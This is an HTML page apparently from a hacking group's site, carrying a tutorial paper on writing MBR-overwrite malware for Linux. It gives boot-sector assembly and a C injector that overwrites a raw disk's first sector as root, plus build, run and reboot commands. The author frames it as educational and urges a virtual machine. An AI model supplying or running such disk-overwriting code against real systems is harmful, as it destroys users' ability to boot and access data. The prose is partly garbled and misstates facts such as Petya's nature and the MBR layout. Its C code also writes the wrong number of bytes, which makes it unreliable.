<!DOCTYPE html>
<html lang="pt">
    <style>
    .ascii {
        color: black;
        padding: 30px;
        text-align: center;
        background-image: url('../../asciiart.png');
        background-repeat: no-repeat;
        background-position: center;
        background-color: black;
    }

    .nav {
        overflow: hidden;
        background-color: rgb(5, 5, 5);
    }
    
    .nav a {
        float: left;
        display: block;
        color: white;
        text-align: center;
        padding: 14px 16px;
        text-decoration: none;
        font-family: monospace;
    }
    
    .nav a:hover {
        background-color: rgb(160, 13, 197);
        color: white;
    }

    .card {
    color: #000;
    background-color: #aaa;
    padding: 20px;
    margin-top: 20px;
    }
    </style>
    <title>Paper: Writing MBR Malware for Linux - Amolo Hunters</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=1024">
    <meta name="viewport" content="width=1024">
    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
    <body style="background-color:black;">
        <div class="nav">
            <a href="../../index.html">Home</a>
            <a href="../../papers/">Papers</a>
            <a href="../../wallpapers/">Wallpapers</a>
            <a href="../../members/">Members</a>
        </div>
        <div class="ascii">
            <h1 style="color:black;" align="right">.</h1>
            <h1 style="color:black;" align="right">.</h1>
        </div>
        <h1 style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">Writing MBR Malware for Linux</h1>
        <p style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">Author: @mrempy</p>
        <div>
                <pre style="color:white;">
                                :::!~!!!!!:.
                            .xUHWH!! !!?M88WHX:.
                          .X*#M@$!!  !X!M$$$$$$WWx:.
                         :!!!!!!?H! :!$!$$$$$$$$$$8X:
                        !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
                       :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
                       ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
                         !:~~~ .:!M"T#$$$$WX??#MRRMMM!
                         ~?WuxiW*`   `"#$$$$8!!!!??!!!
                       :X- M$$$$       `"T#$T~!8$WUXU~
                      :%`  ~#$$$m:        ~!~ ?$$$$$$
                    :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
          .....   -~~:<` !    ~?T#$$@@W@*?$$      /`
          W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
          #"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
          :::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~		- This boot sector has been pwned!
          .~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
          Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
          $R@i.~~ !     :   ~$$$$$B$$en:``
          ?MXT@Wx.~    :     ~"##*$$$$M~



            ▓▓▓▓▓▓        ▓▓▓▓▓▓      ▓▓▓▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓    ▓▓▓▓    
        ░░▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▓▓  
        ░░▓▓▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▓▓  
        ░░▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░Summary░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓  
        ░░▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓  
            ▓▓▒▒░░░░░░░░░░░░░░░░░░1. Petya Ransomware░░░░░░░░░░░░░░░░░▒▒▓▓▓▓
            ▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓▓▓
            ▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓  
        ░░▓▓▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓  
        ░░▓▓▒▒░░░░░░░░░░░░░░░░░░2. What is a boot sector░░░░░░░░░░░░░░▒▒▓▓▓▓
        ░░▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓
        ░░▓▓▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓
            ▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓
            ▓▓▒▒░░░░░░░░░░░░░░3. Coding a simple bootloader░░░░░░░░░░░▒▒▓▓▓▓
            ▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓  
            ▓▓▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓  
            ▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓  
            ▓▓▓▓▒▒░░░░░░░░░░4. Coding an MBR Overwrite malware░░░░░░░░▒▒▓▓▓▓
            ▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓
            ▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓
            ▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓
            ▓▓▒▒░░░░░░░░░░░░░░5. Execution and Demonstration░░░░░░░░░░░░▒▒▓▓
            ▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓▓▓
            ▓▓▒▒░░░░░░░░░░░░░░████████░░░░░░░░░░░░░░██░░░░██████░░░░░░▒▒▒▒  
            ▓▓▒▒░░░░░░░░████████░░░░██████████░░░░░░████████░░████░░░░▒▒▒▒  
        ░░▓▓▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░████░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒  
        ░░▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓  
        ░░▓▓▓▓▒▒░░░░░░░░██░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░████░░░░▒▒▓▓▓▓
            ▓▓▒▒░░░░░░░░██████░░████████░░████░░░░████████████░░██░░░░░░▒▒▓▓
            ▓▓▒▒░░░░░░░░░░░░██████░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓
        ░░▓▓▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓
        ░░▓▓▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒░░░░▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒▓▓
            ▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓  
                ▓▓▓▓▓▓        ▓▓▓▓▓▓    ▓▓▓▓▓▓      ▓▓▓▓      ▓▓▓▓▓▓▓▓▓▓  


        In this paper, I will demonstrate an attack on the boot sector, known as the Master Boot Record (MBR). The attack consists of overwriting
        the boot sector by a malicious sector, the attack is called MBR Overwrite. This MBR attack can prevent the system from booting.
        cialized. In this paper you will learn how to develop simple scripts in 16-bit Assembly using Basic Input/Output switches
        System (BIOS) and a little C. Remembering that this paper was written with educational purposes and for curious people, like me.

        Let's start with a famous malware that was highlighted in 2016 and 2017, the Petya Ransomware.

        ╔═════════════════════════╗
        ║     Petya Ransomware    ║
        ╚═════════════════════════╝

        Petya is a family of cryptocurrency malware that was first discovered in 2016. The malware targets systems
        based on Microsoft Windows. Its objective is to infect the MBR with malicious code that will prevent the system from booting, blocking
        when booting the system. Unlocking is done using a key that is given to the victim after paying the ransom.
        for your data.

        ╔═════════════════════════╗
        ║  What is a boot sector  ║
        ╚═════════════════════════╝

        As said before, the boot sector, known as MBR, is the first sector to be used, the motherboard is responsible for
        this startup. The MBR occupies the first 446 bytes of the boot section and the boot code occupies the remaining 64 bytes.
        Address 0x7C00 is the memory address into which the boot code is loaded when the computer is turned on. That's it
        done by the processor when reading the MBR from the hard disk and loading the initialization code into RAM. The initialization code
        tion, in turn, is responsible for loading the operating system into the rest of the RAM memory.

        ╔══════════════════════════════╗
        ║  Coding a simple bootloader  ║
        ╚══════════════════════════════╝

        To start writing the code, we need to define a few things, first the address 0x7C00, which is the address of the
        boot, and then the bits, which in this case is 16.

        Code:
        ╔═════════════════════════════════╗
        ║ [BITS 16]                       ║
        ║ [ORG 0x7C00]                    ║
        ╚═════════════════════════════════╝

        To jumpstart the last few lines, let's fill the boot code with empty bytes up to 512 bytes and sign it with a magic
        code. We will be signing using the little-endian x86 address, known as 0xAA55.

        Code:
        ╔══════════════════════════════════════════════╗
        ║ [BITS 16]                                    ║
        ║ [ORG 0x7C00]                                 ║
        ║                                              ║
        ║                                              ║
        ║                                              ║
        ║ times 510 - ($ - $$) db 0                    ║
        ║ dw 0xAA55                                    ║
        ╚══════════════════════════════════════════════╝

        The line that has the times function is in charge of filling up to 510 bytes in the binary that will be compiled, while dw will sign
        with address 0xAA55.

        Now we will write a function to print each letter of a defined byte, known as DB. For this, we will move the
        address 0x0E for the AH register, which is a high accumulation register. Subsequently comes accompanied in the bass line the
        character you would like to print being moved to the low-accumulation register called AL. Next line will invoke
        the BIOS switch, known as 0x10, using INT.

        Code:
        ╔══════════════════════════════════════════════╗
        ║ [BITS 16]                                    ║
        ║ [ORG 0x7C00]                                 ║
        ║                                              ║
        ║ mov ah, 0x0E                                 ║
        ║ mov al, 'X'                                  ║
        ║ int 0x10                                     ║
        ║                                              ║
        ║ times 510 - ($ - $$) db 0                    ║
        ║ dw 0xAA55                                    ║
        ╚══════════════════════════════════════════════╝

        Let's compile the code to test that it's working correctly.

        $ nasm -f bin bootloader.asm -o bootloader.bin
        $ qemu-system-x86_64 bootloader.bin

        ╔═════════════════════════════════════════════════════════════════════════════╗
        ║ SeaBIOS (version Arch Linux 1.16.1-1-1)				      ║
        ║									      ║
        ║									      ║
        ║ iPXE (http://ipxe.org) 00:03.0 C900 PCI2.10 PnP PMM+06FD33A0+06F333A0 C900  ║
        ║                                                                             ║  
        ║									      ║
        ║									      ║
        ║ Booting from Hard Disk...						      ║
        ║ X									      ║
        ╚═════════════════════════════════════════════════════════════════════════════╝

        We can see that it is working correctly.

        Now we can create a function to print all characters from a variable. I will use the same code that I used in
        my article on printing strings in 16-bit assembly. I will not explain in detail how the function works in this
        paper, but here is the link for those who are curious:

        https://medium.com/@mrempy/assembly-16-bits-printing-strings-a114c72f6e43

        Code:
        ╔═══════════════════════════════════════════════════════╗
        ║ [BITS 16]                                             ║
        ║ [ORG 0x7C00]                                          ║
        ║                                                       ║
        ║ Jmp Main                                              ║
        ║                                                       ║
        ║ Main:                                                 ║
        ║     mov si, pwnedmessage                              ║
        ║     call Print                                        ║
        ║     jmp $                                             ║
        ║                                                       ║
        ║ Print:                                                ║
        ║     mov ah, 0x0E                                      ║
        ║     mov al, [si]                                      ║
        ║     loop:                                             ║
        ║         int 0x10                                      ║
        ║         inc si                                        ║
        ║         mov al, [si]                                  ║
        ║         cmp al, 0                                     ║
        ║         jne loop                                      ║
        ║     ret                                               ║
        ║ ret                                                   ║
        ║                                                       ║
        ║                                                       ║
        ║ pwnedmessage db "This boot sector has been pwned!"    ║
        ║                                                       ║
        ║ times 510 - ($ - $$) db 0                             ║
        ║ dw 0xAA55                                             ║
        ╚═══════════════════════════════════════════════════════╝

        The code for the boot sector is ready, we can compile and test it.

        $ nasm -f bin bootloader.asm -o bootloader.bin
        $ qemu-system-x86_64 bootloader.bin

        ╔═════════════════════════════════════════════════════════════════════════════╗
        ║ SeaBIOS (version Arch Linux 1.16.1-1-1)				      ║
        ║									      ║
        ║									      ║
        ║ iPXE (http://ipxe.org) 00:03.0 C900 PCI2.10 PnP PMM+06FD33A0+06F333A0 C900  ║
        ║                                                                             ║  
        ║									      ║
        ║									      ║
        ║ Booting from Hard Disk...						      ║
        ║ This boot sector has been pwned!			          	      ║
        ╚═════════════════════════════════════════════════════════════════════════════╝

        ╔════════════════════════════════════╗
        ║  Codando um malware MBR Overwrite  ║
        ╚════════════════════════════════════╝

        Now we need to develop malware to replace the MBR with the malicious code we have, so we have to define the
        script headers.

        Code:
        ╔═══════════════════════════════════════════════════════════════════════════════════╗
        ║ #include <.stdio.h>    # remove that dot at the beginning of the less than sign   ║
        ║ #include <.stdlib.h>							            ║
        ║ #include <.unistd.h>							            ║
        ║                                                                                   ║  
        ║ int main(int argc, char* argv[]) {                                                ║  
        ║     return 0;								            ║
        ║ }									            ║
        ║                      						                    ║
        ║                                   			                 	    ║
        ╚═══════════════════════════════════════════════════════════════════════════════════╝

        To add the boot sector malicious code, we can use CyberChef to turn the binary into Hex and add it
        into an unsigned char variable.

        CyberChef: https://icyberchef.com/#recipe=To_Hex('%5C%5Cx',0)
        Code:
        ╔═════════════════════════════════════════════════════════════════════════════╗
        ║ #include <.stdio.h>							      ║
        ║ #include <.stdlib.h>							      ║
        ║ #include <.unistd.h>							      ║
        ║                                                                             ║  
        ║ int main(int argc, char* argv[]) {                                          ║  
        ║     unsigned char* payload = "\x01\x02\x03\x04\x05...";                     ║  
        ║     return 0;								      ║
        ║ }									      ║
        ║                      						              ║
        ║                                   			          	      ║
        ╚═════════════════════════════════════════════════════════════════════════════╝

        Now we need to write code to open the disk's file system to write the bytes to it, and then define
        the starting point of writing, so as not to end up "wiping" the disk and adding the payload.

        Code:
        ╔═════════════════════════════════════════════════════════════════════════════╗
        ║ #include <.stdio.h>							      ║
        ║ #include <.stdlib.h>							      ║
        ║ #include <.unistd.h>							      ║
        ║                                                                             ║  
        ║ int main(int argc, char* argv[]) {                                          ║  
        ║     unsigned char* payload = "\x01\x02\x03\x04\x05...";                     ║
        ║     FILE* harddisk;                                                         ║  
        ║                                                                             ║  
        ║     if (geteuid() != 0) {                                                   ║  
        ║         puts("You need to run as root user");                               ║    
        ║         return 1;                                                           ║  
        ║     }                                                                       ║  
        ║     harddisk = fopen(argv[1], "wb");                                        ║  
        ║     fseek(harddisk, 0, SEEK_SET);                                           ║  
        ║     fwrite(payload, sizeof(payload), 1, harddisk);                          ║  
        ║     fclose(harddisk);                                                       ║
        ║     return 0;								      ║
        ║ }									      ║
        ║                      						              ║
        ║                                   			          	      ║
        ╚═════════════════════════════════════════════════════════════════════════════╝

        You need to know what your disk path is, for example /dev/sda.

        All done! Now it's just a matter of compiling and running in a virtualized environment so as not to cause damage to the machine.

        $ gcc injector.c -o injector.elf

        ╔═══════════════════════════════╗
        ║  Execution and Demonstration  ║
        ╚═══════════════════════════════╝

        After uploading the code and compiling it to a virtual environment, run the binary as root and reboot the machine.

        $ sudo ./injector.elf
        $ reboot

        After restarting the machine you will get a message similar to:

        ╔═════════════════════════════════════════════════════════════════════════════╗
        ║ This boot sector has been pwned!			          	      ║
        ║									      ║
        ║									      ║
        ║									      ║
        ║                                                                             ║  
        ║									      ║
        ║									      ║
        ║									      ║
        ║									      ║
        ╚═════════════════════════════════════════════════════════════════════════════╝

        Watch a GIF example demonstrating the injection and machine restart:
        https://github.com/MrEmpy/MBROverwrite/blob/main/assets/demo.gif


                                    _--_
                                    /   -)
                                ___/___|___
                    ____-----=~~///|     ||||~~~==-----_____
                //~////////////~/|     |//|||||\\\\\\\\\\\\\
                ////////////////////|   |///////|\\\\\\\\\\\\\\\
            /////~~~~~~~~~~~~~~~\ |.||/~~~~~~~~~~~~~~~~~`\\\\\
            //~                  /\\|\\                      ~\\
                                ///W^\W\
                                ////|||\\\
                                ~~~~~~~~~~
                              Amolo Hunters


        Thank you for reading my paper, see you next time ;)
                </pre>                    
        </div>
    </body>
</html>
